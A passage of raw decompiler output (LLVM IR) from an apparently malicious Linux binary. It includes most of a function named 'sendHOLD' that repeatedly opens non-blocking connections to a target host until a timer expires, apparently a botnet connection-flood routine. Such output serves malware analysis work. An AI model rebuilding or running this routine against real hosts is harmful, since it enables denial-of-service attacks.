  %v1_804f98a = inttoptr i32 %v1_804f985 to i32*
  %v2_804f98a = load i32, i32* %v1_804f98a, align 4
  store i32 %v2_804f98a, i32* %eax.global-to-local, align 4
  %v9_804f98c = icmp eq i32 %v2_804f98a, 11
  br i1 %v9_804f98c, label %dec_label_pc_804f9ad, label %dec_label_pc_804f991

dec_label_pc_804f991:                             ; preds = %dec_label_pc_804f985
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f997 = load i32, i32* %v4_804f95e, align 8
  store i32 %v5_804f997, i32* %eax.global-to-local, align 4
  %v1_804f99a = load i32, i32* @esp, align 4
  %v2_804f99a = inttoptr i32 %v1_804f99a to i32*
  store i32 %v5_804f997, i32* %v2_804f99a, align 4
  %v0_804f99d = load i32, i32* %stack_var_-200, align 4
  %v1_804f99d = call i32 @__libc_close(i32 %v0_804f99d)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f719, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f9ad:                             ; preds = %dec_label_pc_804f741, %dec_label_pc_804f985, %dec_label_pc_804f945, %dec_label_pc_804f91d, %dec_label_pc_804f927, %dec_label_pc_804f90d, %dec_label_pc_804f8ec, %dec_label_pc_804f803, %dec_label_pc_804f7ed, %dec_label_pc_804f991
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804f91d ], [ 10000, %dec_label_pc_804f927 ], [ 10000, %dec_label_pc_804f90d ], [ 10000, %dec_label_pc_804f8ec ], [ %stack_var_-192.140, %dec_label_pc_804f945 ], [ %stack_var_-192.140, %dec_label_pc_804f985 ], [ %stack_var_-192.140, %dec_label_pc_804f991 ], [ %stack_var_-192.140, %dec_label_pc_804f7ed ], [ %stack_var_-192.140, %dec_label_pc_804f803 ], [ %stack_var_-192.140, %dec_label_pc_804f741 ]
  %v4_804f9ad = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804f9ad, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804f9ad, %v2_804f61f
  br i1 %exitcond, label %dec_label_pc_804f9bc, label %dec_label_pc_804f713

dec_label_pc_804f9bc:                             ; preds = %dec_label_pc_804f9b0.preheader, %dec_label_pc_804f9ad, %dec_label_pc_804f65d
  %stack_var_-192.2 = phi i32 [ %tmp2, %dec_label_pc_804f65d ], [ %stack_var_-192.2, %dec_label_pc_804f9b0.preheader ], [ %stack_var_-192.0, %dec_label_pc_804f9ad ]
  %stack_var_-36.0 = phi i32 [ %tmp6, %dec_label_pc_804f65d ], [ 0, %dec_label_pc_804f9b0.preheader ], [ %v2_804f61f, %dec_label_pc_804f9ad ]
  %v0_804f9bc = load i32, i32* @esp, align 4
  %v1_804f9bc = inttoptr i32 %v0_804f9bc to i32*
  store i32 0, i32* %v1_804f9bc, align 4
  %v1_804f9c3 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804f9c3 = call i32 @__GI_time(i32* %v1_804f9c3)
  store i32 %v2_804f9c3, i32* %eax.global-to-local, align 4
  %v5_804f9cb = icmp slt i32 %v2_804f9c3, %v5_804f6fc
  br i1 %v5_804f9cb, label %dec_label_pc_804f9b0.preheader, label %dec_label_pc_804f9d1

dec_label_pc_804f9b0.preheader:                   ; preds = %dec_label_pc_804f9bc
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804f9b338, label %dec_label_pc_804f713, label %dec_label_pc_804f9bc

dec_label_pc_804f9d1:                             ; preds = %dec_label_pc_804f9bc, %entry
  %v0_804f9dd = phi i32 [ %v3_804f64f, %entry ], [ %v2_804f9c3, %dec_label_pc_804f9bc ]
  %v2_804f9da = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f9da, i32* @ebx, align 4
  store i32 %v0_804f601, i32* @edi, align 4
  ret i32 %v0_804f9dd

; uselistorder directives
  uselistorder i32 %v4_804f9ad, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v5_804f895, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f843, { 1, 0 }
  uselistorder i32* %v4_804f832, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804f719, { 6, 1, 0, 2, 3, 4, 5, 7 }
  uselistorder i8* %v5_804f719, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.140, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge41, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 0, 1 }
  uselistorder i32 %v1_804f6ca, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v2_804f6b4, { 1, 0 }
  uselistorder i32 %v2_804f697, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804f62d, { 1, 0 }
  uselistorder i32 %v2_804f61f, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f611, { 1, 0, 2 }
  uselistorder i32 %v12_804f603, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-200, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 52, 1, 43, 0, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 14, 15, 13, 16, 17, 21, 18, 19, 20, 22, 23, 25, 24, 28, 26, 27, 29, 30, 34, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 44, 46, 45, 47, 49, 48, 50, 51 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9ad, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f9e1 = load i32, i32* @edi, align 4
  %v0_804f9e2 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9e2, i32* %stack_var_-12, align 4
  %v12_804f9e3 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v12_804f9e3, i32* %eax.global-to-local, align 4
  %v1_804f9f1 = call i32 @getdtablesize(i32 %v12_804f9e3)
  store i32 %v1_804f9f1, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f9f1, 0
  %v2_804f9fa = zext i1 %tmp to i32
  %v2_804f9fd = add i32 %v2_804f9fa, %v1_804f9f1
  %v2_804f9ff = sdiv i32 %v2_804f9fd, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804fa0d = urem i32 %arg2, 65536
  store i32 %v1_804fa0d, i32* %eax.global-to-local, align 4
  store i32 %v1_804fa0d, i32* %stack_var_-252, align 4
  %v1_804fa13 = trunc i32 %arg2 to i16
  %v2_804fa13 = call i32 @htons(i16 %v1_804fa13)
  %v2_804fa1f = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-252, align 4
  %v3_804fa2f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804fa2f, i32* %eax.global-to-local, align 4
  %v1_804fa34 = icmp eq i32 %v3_804fa2f, 0
  br i1 %v1_804fa34, label %dec_label_pc_804fa3d, label %dec_label_pc_804fdf8

dec_label_pc_804fa3d:                             ; preds = %entry
  %v2_804fa53 = mul i32 %v2_804f9ff, 8
  %v1_804fa59 = add i32 %v2_804fa53, 30
  %v2_804fa5c = and i32 %v1_804fa59, -16
  %v0_804fa62 = load i32, i32* @esp, align 4
  %v2_804fa62 = sub i32 %v0_804fa62, %v2_804fa5c
  %v1_804fa74 = add i32 %v2_804fa62, 35
  %v2_804fa77 = and i32 %v1_804fa74, -16
  %v2_804fa94 = mul i32 %v2_804f9ff, 5
  store i32 %v2_804fa94, i32* %edx.global-to-local, align 4
  %v1_804fa9a = inttoptr i32 %v2_804fa77 to i8*
  store i32 %v2_804fa77, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804fa9f = and i32 %v1_804fa74, -256
  store i32 %v1_804fa9f, i32* %eax.global-to-local, align 4
  %v5_804faa1 = call i8* @_memset(i8* %v1_804fa9a, i32 %v1_804fa9f, i32 %v2_804fa94)
  %v0_804faa3 = load i32, i32* @esp, align 4
  %v1_804faa3 = inttoptr i32 %v0_804faa3 to i32*
  store i32 1024, i32* %v1_804faa3, align 4
  %v1_804faaa = call i32 @malloc(i32 %v2_804fa77)
  store i32 %v1_804faaa, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804fabc = load i32, i32* @esp, align 4
  %v2_804fabc = add i32 %v1_804fabc, 8
  %v3_804fabc = inttoptr i32 %v2_804fabc to i32*
  store i32 1024, i32* %v3_804fabc, align 4
  %v0_804fac0 = load i32, i32* @esp, align 4
  %v1_804fac0 = add i32 %v0_804fac0, 4
  %v2_804fac0 = inttoptr i32 %v1_804fac0 to i32*
  store i32 0, i32* %v2_804fac0, align 4
  %v0_804fac8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fac8 = load i32, i32* @esp, align 4
  %v2_804fac8 = inttoptr i32 %v1_804fac8 to i32*
  store i32 %v0_804fac8, i32* %v2_804fac8, align 4
  %v3_804facb = inttoptr i32 %v1_804faaa to i8*
  %v4_804facb = call i32 @__GI_memset(i8* %v3_804facb, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804facb, i32* %eax.global-to-local, align 4
  %v0_804fad0 = load i32, i32* @esp, align 4
  %v1_804fad0 = inttoptr i32 %v0_804fad0 to i32*
  store i32 0, i32* %v1_804fad0, align 4
  %v1_804fad7 = inttoptr i32 %v1_804faaa to i32*
  %v2_804fad7 = call i32 @__GI_time(i32* %v1_804fad7)
  %v5_804fadc = add i32 %v2_804fad7, %arg3
  store i32 %v5_804fadc, i32* %eax.global-to-local, align 4
  %v3_804faf9 = or i32 %v2_804fa77, 4
  %v2_804fbfd = ptrtoint i32* %stack_var_-196 to i32
  %tmp33 = bitcast i32* %stack_var_-196 to i8*
  %v2_804fc4e = ptrtoint i32* %stack_var_-204 to i32
  %v2_804fc96 = ptrtoint i32* %stack_var_-208 to i32
  %v2_804fca0 = ptrtoint i32* %stack_var_-212 to i32
  %v16_804fdda40 = icmp sgt i32 %v2_804f9fd, 1
  br label %dec_label_pc_804fde3

dec_label_pc_804faf3:                             ; preds = %dec_label_pc_804fdd7.preheader, %dec_label_pc_804fdd4
  %storemerge42 = phi i32 [ %v4_804fdd4, %dec_label_pc_804fdd4 ], [ 0, %dec_label_pc_804fdd7.preheader ]
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804fa77, i32* %edx.global-to-local, align 4
  %v2_804faf9 = mul i32 %storemerge42, 8
  %v4_804faf9 = add i32 %v2_804faf9, %v3_804faf9
  %v5_804faf9 = inttoptr i32 %v4_804faf9 to i8*
  %v6_804faf9 = load i8, i8* %v5_804faf9, align 4
  %v7_804faf9 = zext i8 %v6_804faf9 to i32
  store i32 %v7_804faf9, i32* %eax.global-to-local, align 4
  %v8_804fb07 = icmp eq i8 %v6_804faf9, 0
  %v12_804fb07 = icmp eq i8 %v6_804faf9, 1
  br i1 %v12_804fb07, label %dec_label_pc_804fbf3, label %dec_label_pc_804fb14

dec_label_pc_804fb14:                             ; preds = %dec_label_pc_804faf3
  %v12_804fb14 = icmp eq i8 %v6_804faf9, 2
  br i1 %v12_804fb14, label %dec_label_pc_804fd28, label %dec_label_pc_804fb21

dec_label_pc_804fb21:                             ; preds = %dec_label_pc_804fb14
  br i1 %v8_804fb07, label %dec_label_pc_804fb2f, label %dec_label_pc_804fdd4

dec_label_pc_804fb2f:                             ; preds = %dec_label_pc_804fb21
  store i32 %storemerge42, i32* @ebx, align 4
  %v0_804fb32 = load i32, i32* @esp, align 4
  %v1_804fb32 = add i32 %v0_804fb32, 8
  %v2_804fb32 = inttoptr i32 %v1_804fb32 to i32*
  store i32 0, i32* %v2_804fb32, align 4
  %v0_804fb3a = load i32, i32* @esp, align 4
  %v1_804fb3a = add i32 %v0_804fb3a, 4
  %v2_804fb3a = inttoptr i32 %v1_804fb3a to i32*
  store i32 1, i32* %v2_804fb3a, align 4
  %v0_804fb42 = load i32, i32* @esp, align 4
  %v1_804fb42 = inttoptr i32 %v0_804fb42 to i32*
  store i32 2, i32* %v1_804fb42, align 4
  %v3_804fb49 = call i32 @socket(i32 %v7_804faf9, i32 %v12_804f9e3, i32 ptrtoint (i32* @0 to i32))
  %v2_804fb53 = load i32, i32* @ebx, align 4
  %v3_804fb53 = mul i32 %v2_804fb53, 8
  %v4_804fb53 = add i32 %v3_804fb53, %v2_804fa77
  %v5_804fb53 = inttoptr i32 %v4_804fb53 to i32*
  store i32 %v3_804fb49, i32* %v5_804fb53, align 8
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v3_804fb5c = add i32 %v2_804faf9, %v2_804fa77
  %v4_804fb5c = inttoptr i32 %v3_804fb5c to i32*
  %v5_804fb5c = load i32, i32* %v4_804fb5c, align 8
  store i32 %v5_804fb5c, i32* %eax.global-to-local, align 4
  %v0_804fb5f = load i32, i32* @esp, align 4
  %v1_804fb5f = add i32 %v0_804fb5f, 8
  %v2_804fb5f = inttoptr i32 %v1_804fb5f to i32*
  store i32 0, i32* %v2_804fb5f, align 4
  %v0_804fb67 = load i32, i32* @esp, align 4
  %v1_804fb67 = add i32 %v0_804fb67, 4
  %v2_804fb67 = inttoptr i32 %v1_804fb67 to i32*
  store i32 3, i32* %v2_804fb67, align 4
  %v0_804fb6f = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb6f = load i32, i32* @esp, align 4
  %v2_804fb6f = inttoptr i32 %v1_804fb6f to i32*
  store i32 %v0_804fb6f, i32* %v2_804fb6f, align 4
  %v3_804fb72 = call i32 @__libc_fcntl(i32 %v7_804faf9, i32 %v12_804f9e3, i32 ptrtoint (i32* @0 to i32))
  %v1_804fb79 = or i32 %v3_804fb72, 2048
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fb85 = load i32, i32* %v4_804fb5c, align 8
  store i32 %v5_804fb85, i32* %eax.global-to-local, align 4
  %v1_804fb88 = load i32, i32* @esp, align 4
  %v2_804fb88 = add i32 %v1_804fb88, 8
  %v3_804fb88 = inttoptr i32 %v2_804fb88 to i32*
  store i32 %v1_804fb79, i32* %v3_804fb88, align 4
  %v0_804fb8c = load i32, i32* @esp, align 4
  %v1_804fb8c = add i32 %v0_804fb8c, 4
  %v2_804fb8c = inttoptr i32 %v1_804fb8c to i32*
  store i32 4, i32* %v2_804fb8c, align 4
  %v0_804fb94 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb94 = load i32, i32* @esp, align 4
  %v2_804fb94 = inttoptr i32 %v1_804fb94 to i32*
  store i32 %v0_804fb94, i32* %v2_804fb94, align 4
  %v3_804fb97 = call i32 @__libc_fcntl(i32 %v7_804faf9, i32 %v12_804f9e3, i32 ptrtoint (i32* @0 to i32))
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fba5 = load i32, i32* %v4_804fb5c, align 8
  store i32 %v5_804fba5, i32* %eax.global-to-local, align 4
  %v0_804fba8 = load i32, i32* @esp, align 4
  %v1_804fba8 = add i32 %v0_804fba8, 8
  %v2_804fba8 = inttoptr i32 %v1_804fba8 to i32*
  store i32 16, i32* %v2_804fba8, align 4
  %v1_804fbb0 = load i32, i32* @esp, align 4
  %v2_804fbb0 = add i32 %v1_804fbb0, 4
  %v3_804fbb0 = inttoptr i32 %v2_804fbb0 to i32*
  store i32 %v2_804fa1f, i32* %v3_804fbb0, align 4
  %v0_804fbb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fbb4 = load i32, i32* @esp, align 4
  %v2_804fbb4 = inttoptr i32 %v1_804fbb4 to i32*
  store i32 %v0_804fbb4, i32* %v2_804fbb4, align 4
  %v3_804fbb7 = call i32 @__libc_connect(i32 %v7_804faf9, i32 %v12_804f9e3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804fbb7, i32* %eax.global-to-local, align 4
  %v10_804fbbc = icmp eq i32 %v3_804fbb7, -1
  %v1_804fbbf = icmp eq i1 %v10_804fbbc, false
  br i1 %v1_804fbbf, label %dec_label_pc_804fbcd, label %dec_label_pc_804fbc1

dec_label_pc_804fbc1:                             ; preds = %dec_label_pc_804fb2f
  %v1_804fbc1 = call i32 @__errno_location(i32 %v7_804faf9)
  store i32 %v1_804fbc1, i32* %eax.global-to-local, align 4
  %v1_804fbc6 = inttoptr i32 %v1_804fbc1 to i32*
  %v2_804fbc6 = load i32, i32* %v1_804fbc6, align 4
  store i32 %v2_804fbc6, i32* %eax.global-to-local, align 4
  %v9_804fbc8 = icmp eq i32 %v2_804fbc6, 115
  br i1 %v9_804fbc8, label %dec_label_pc_804fbe3, label %dec_label_pc_804fbcd

dec_label_pc_804fbcd:                             ; preds = %dec_label_pc_804fbc1, %dec_label_pc_804fb2f
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804fa77, i32* %edx.global-to-local, align 4
  %v5_804fbd3 = load i32, i32* %v4_804fb5c, align 8
  store i32 %v5_804fbd3, i32* %eax.global-to-local, align 4
  %v1_804fbd6 = load i32, i32* @esp, align 4
  %v2_804fbd6 = inttoptr i32 %v1_804fbd6 to i32*
  store i32 %v5_804fbd3, i32* %v2_804fbd6, align 4
  %v1_804fbd9 = call i32 @__libc_close(i32 %v7_804faf9)
  store i32 %v1_804fbd9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fbe3:                             ; preds = %dec_label_pc_804fbc1
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804faf9, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fbf3:                             ; preds = %dec_label_pc_804faf3
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804fbfd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804fc04 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v3_804fc12 = add i32 %v2_804faf9, %v2_804fa77
  %v4_804fc12 = inttoptr i32 %v3_804fc12 to i32*
  %v5_804fc12 = load i32, i32* %v4_804fc12, align 8
  %v2_804fc17 = udiv i32 %v5_804fc12, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fc20 = load i32, i32* %v4_804fc12, align 8
  %v1_804fc23 = urem i32 %v5_804fc20, 32
  store i32 %v1_804fc23, i32* %eax.global-to-local, align 4
  %v0_804fc26 = load i32, i32* @ebp, align 4
  %v2_804fc26 = mul nuw nsw i32 %v2_804fc17, 4
  %v3_804fc26 = add nsw i32 %v2_804fc26, -192
  %v4_804fc26 = add i32 %v3_804fc26, %v0_804fc26
  %v5_804fc26 = inttoptr i32 %v4_804fc26 to i32*
  %v6_804fc26 = load i32, i32* %v5_804fc26, align 4
  %v9_804fc26 = shl i32 1, %v1_804fc23
  %v12_804fc26 = or i32 %v6_804fc26, %v9_804fc26
  store i32 %v12_804fc26, i32* %v5_804fc26, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fc48 = load i32, i32* %v4_804fc12, align 8
  %v1_804fc4b = add i32 %v5_804fc48, 1
  store i32 %v1_804fc4b, i32* %edx.global-to-local, align 4
  %v1_804fc54 = load i32, i32* @esp, align 4
  %v2_804fc54 = add i32 %v1_804fc54, 16
  %v3_804fc54 = inttoptr i32 %v2_804fc54 to i32*
  store i32 %v2_804fc4e, i32* %v3_804fc54, align 4
  %v0_804fc58 = load i32, i32* @esp, align 4
  %v1_804fc58 = add i32 %v0_804fc58, 12
  %v2_804fc58 = inttoptr i32 %v1_804fc58 to i32*
  store i32 0, i32* %v2_804fc58, align 4
  store i32 %v2_804fbfd, i32* %eax.global-to-local, align 4
  %v1_804fc66 = load i32, i32* @esp, align 4
  %v2_804fc66 = add i32 %v1_804fc66, 8
  %v3_804fc66 = inttoptr i32 %v2_804fc66 to i32*
  store i32 %v2_804fbfd, i32* %v3_804fc66, align 4
  %v0_804fc6a = load i32, i32* @esp, align 4
  %v1_804fc6a = add i32 %v0_804fc6a, 4
  %v2_804fc6a = inttoptr i32 %v1_804fc6a to i32*
  store i32 0, i32* %v2_804fc6a, align 4
  %v0_804fc72 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc72 = load i32, i32* @esp, align 4
  %v2_804fc72 = inttoptr i32 %v1_804fc72 to i32*
  store i32 %v0_804fc72, i32* %v2_804fc72, align 4
  %v0_804fc75 = load i32, i32* %stack_var_-204, align 4
  %v2_804fc75 = load i32, i32* %stack_var_-196, align 4
  %v5_804fc75 = call i32 @__libc_select(i32 %v0_804fc75, i32 10000, i32 %v2_804fc75, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804fc75, i32* %eax.global-to-local, align 4
  %v12_804fc7d = icmp eq i32 %v5_804fc75, 1
  %v1_804fc81 = icmp eq i1 %v12_804fc7d, false
  br i1 %v1_804fc81, label %dec_label_pc_804fcfd, label %dec_label_pc_804fc83

dec_label_pc_804fc83:                             ; preds = %dec_label_pc_804fbf3
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fc93 = load i32, i32* %v4_804fc12, align 8
  store i32 %v5_804fc93, i32* %edx.global-to-local, align 4
  %v1_804fc9c = load i32, i32* @esp, align 4
  %v2_804fc9c = add i32 %v1_804fc9c, 16
  %v3_804fc9c = inttoptr i32 %v2_804fc9c to i32*
  store i32 %v2_804fc96, i32* %v3_804fc9c, align 4
  store i32 %v2_804fca0, i32* %eax.global-to-local, align 4
  %v1_804fca6 = load i32, i32* @esp, align 4
  %v2_804fca6 = add i32 %v1_804fca6, 12
  %v3_804fca6 = inttoptr i32 %v2_804fca6 to i32*
  store i32 %v2_804fca0, i32* %v3_804fca6, align 4
  %v0_804fcaa = load i32, i32* @esp, align 4
  %v1_804fcaa = add i32 %v0_804fcaa, 8
  %v2_804fcaa = inttoptr i32 %v1_804fcaa to i32*
  store i32 4, i32* %v2_804fcaa, align 4
  %v0_804fcb2 = load i32, i32* @esp, align 4
  %v1_804fcb2 = add i32 %v0_804fcb2, 4
  %v2_804fcb2 = inttoptr i32 %v1_804fcb2 to i32*
  store i32 1, i32* %v2_804fcb2, align 4
  %v0_804fcba = load i32, i32* %edx.global-to-local, align 4
  %v1_804fcba = load i32, i32* @esp, align 4
  %v2_804fcba = inttoptr i32 %v1_804fcba to i32*
  store i32 %v0_804fcba, i32* %v2_804fcba, align 4
  %v0_804fcbd = load i32, i32* %stack_var_-208, align 4
  %v1_804fcbd = load i32, i32* %stack_var_-204, align 4
  %v3_804fcbd = load i32, i32* %stack_var_-196, align 4
  %v5_804fcbd = call i32 @getsockopt(i32 %v0_804fcbd, i32 %v1_804fcbd, i32 10000, i32 %v3_804fcbd, i32 ptrtoint (i32* @0 to i32))
  %v3_804fcc2 = load i32, i32* %stack_var_-212, align 4
  %v1_804fcc8 = icmp eq i32 %v3_804fcc2, 0
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  br i1 %v1_804fcc8, label %dec_label_pc_804fced, label %dec_label_pc_804fccc

dec_label_pc_804fccc:                             ; preds = %dec_label_pc_804fc83
  %v5_804fcd2 = load i32, i32* %v4_804fc12, align 8
  store i32 %v5_804fcd2, i32* %eax.global-to-local, align 4
  %v1_804fcd5 = load i32, i32* @esp, align 4
  %v2_804fcd5 = inttoptr i32 %v1_804fcd5 to i32*
  store i32 %v5_804fcd2, i32* %v2_804fcd5, align 4
  %v0_804fcd8 = load i32, i32* %stack_var_-208, align 4
  %v1_804fcd8 = call i32 @__libc_close(i32 %v0_804fcd8)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804faf9, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fced:                             ; preds = %dec_label_pc_804fc83
  store i8 2, i8* %v5_804faf9, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fcfd:                             ; preds = %dec_label_pc_804fbf3
  %v13_804fcfd = icmp eq i32 %v5_804fc75, -1
  %v1_804fd01 = icmp eq i1 %v13_804fcfd, false
  br i1 %v1_804fd01, label %dec_label_pc_804fdd4, label %dec_label_pc_804fd07

dec_label_pc_804fd07:                             ; preds = %dec_label_pc_804fcfd
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fd0d = load i32, i32* %v4_804fc12, align 8
  store i32 %v5_804fd0d, i32* %eax.global-to-local, align 4
  %v1_804fd10 = load i32, i32* @esp, align 4
  %v2_804fd10 = inttoptr i32 %v1_804fd10 to i32*
  store i32 %v5_804fd0d, i32* %v2_804fd10, align 4
  %v1_804fd13 = call i32 @__libc_close(i32 %v5_804fc75)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804faf9, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fd28:                             ; preds = %dec_label_pc_804fb14
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804fbfd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804fd39 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v3_804fd47 = add i32 %v2_804faf9, %v2_804fa77
  %v4_804fd47 = inttoptr i32 %v3_804fd47 to i32*
  %v5_804fd47 = load i32, i32* %v4_804fd47, align 8
  %v2_804fd4c = udiv i32 %v5_804fd47, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fd55 = load i32, i32* %v4_804fd47, align 8
  %v1_804fd58 = urem i32 %v5_804fd55, 32
  store i32 %v1_804fd58, i32* %eax.global-to-local, align 4
  %v0_804fd5b = load i32, i32* @ebp, align 4
  %v2_804fd5b = mul nuw nsw i32 %v2_804fd4c, 4
  %v3_804fd5b = add nsw i32 %v2_804fd5b, -192
  %v4_804fd5b = add i32 %v3_804fd5b, %v0_804fd5b
  %v5_804fd5b = inttoptr i32 %v4_804fd5b to i32*
  %v6_804fd5b = load i32, i32* %v5_804fd5b, align 4
  %v9_804fd5b = shl i32 1, %v1_804fd58
  %v12_804fd5b = or i32 %v6_804fd5b, %v9_804fd5b
  store i32 %v12_804fd5b, i32* %v5_804fd5b, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa77, i32* %eax.global-to-local, align 4
  %v5_804fd7d = load i32, i32* %v4_804fd47, align 8
  %v1_804fd80 = add i32 %v5_804fd7d, 1
  store i32 %v1_804fd80, i32* %edx.global-to-local, align 4
  %v1_804fd89 = load i32, i32* @esp, align 4
  %v2_804fd89 = add i32 %v1_804fd89, 16
  %v3_804fd89 = inttoptr i32 %v2_804fd89 to i32*
  store i32 %v2_804fc4e, i32* %v3_804fd89, align 4
  store i32 %v2_804fbfd, i32* %eax.global-to-local, align 4
  %v1_804fd93 = load i32, i32* @esp, align 4
  %v2_804fd93 = add i32 %v1_804fd93, 12
  %v3_804fd93 = inttoptr i32 %v2_804fd93 to i32*
  store i32 %v2_804fbfd, i32* %v3_804fd93, align 4
  %v0_804fd97 = load i32, i32* @esp, align 4
  %v1_804fd97 = add i32 %v0_804fd97, 8
  %v2_804fd97 = inttoptr i32 %v1_804fd97 to i32*
  store i32 0, i32* %v2_804fd97, align 4
  %v0_804fd9f = load i32, i32* @esp, align 4
